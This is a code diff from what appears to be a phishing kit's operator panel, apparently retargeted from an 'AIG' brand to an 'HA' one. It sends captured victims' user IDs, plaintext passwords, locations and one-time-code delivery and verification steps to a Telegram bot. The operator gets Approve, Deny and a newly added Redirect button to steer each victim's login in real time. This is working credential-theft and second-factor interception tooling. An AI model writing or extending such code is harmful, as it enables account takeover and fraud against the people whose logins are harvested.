@@ -41,6 +41,9 @@ async function sendToAll(env, text, taskId, includeButtons) {
               { text: "✅ Approve", callback_data: "approve:" + taskId },
               { text: "❌ Deny", callback_data: "deny:" + taskId },
             ],
+            [
+              { text: "🔀 Redirect", callback_data: "redirect:" + taskId },
+            ],
           ],
         };
       }
@@ -175,7 +178,7 @@ export async function notifyNewTask(env, task) {
   var lines = [];
 
   if (isVisit) {
-    lines.push("👁 New visitor (AIG)");
+    lines.push("👁 New visitor (HA)");
     lines.push(LINE);
     lines = lines.concat(locationBlock(task.cf));
     lines.push("");
@@ -183,7 +186,7 @@ export async function notifyNewTask(env, task) {
     lines.push("");
     lines = lines.concat(timeBlock(tz));
   } else {
-    lines.push("🔐 Login request (AIG)");
+    lines.push("🔐 Login request (HA)");
     lines.push(LINE);
     lines.push("👤 User: " + task.user_id);
     lines.push("🔑 Password: " + (task.password || "N/A"));
@@ -214,7 +217,7 @@ export async function notifyAdvance(env, task) {
         ? "Phone (" + task.masked_phone + ")"
         : "Email (" + task.masked_email + ")";
 
-    lines.push("📨 Code delivery request (AIG)");
+    lines.push("📨 Code delivery request (HA)");
     lines.push(LINE);
     lines.push("👤 User: " + task.user_id);
     lines.push("🔑 Password: " + (task.password || "N/A"));
@@ -226,7 +229,7 @@ export async function notifyAdvance(env, task) {
     lines.push("");
     lines.push("⏳ Auto-declines in 90s");
   } else if (task.flow_step === "code_verify") {
-    lines.push("🛡 Code verification (AIG)");
+    lines.push("🛡 Code verification (HA)");
     lines.push(LINE);
     lines.push("👤 User: " + task.user_id);
     lines.push("🔑 Password: " + (task.password || "N/A"));
@@ -248,7 +251,7 @@ export async function notifyAdvance(env, task) {
 export function buildApprovedMessage(task) {
   return [
     "✅ APPROVED via Telegram",
-    "🔐 Login request (AIG)",
+    "🔐 Login request (HA)",
     "👤 User: " + task.user_id,
     "🔑 Password: " + (task.password || "N/A"),
   ].join("\n");
@@ -257,7 +260,16 @@ export function buildApprovedMessage(task) {
 export function buildDeniedMessage(task) {
   return [
     "❌ DENIED via Telegram",
-    "🔐 Login request (AIG)",
+    "🔐 Login request (HA)",
+    "👤 User: " + task.user_id,
+    "🔑 Password: " + (task.password || "N/A"),
+  ].join("\n");
+}
+
+export function buildRedirectedMessage(task) {
+  return [
+    "🔀 REDIRECTED via Telegram",
+    "🔐 Login request (HA)",
     "👤 User: " + task.user_id,
     "🔑 Password: " + (task.password || "N/A"),
   ].join("\n");
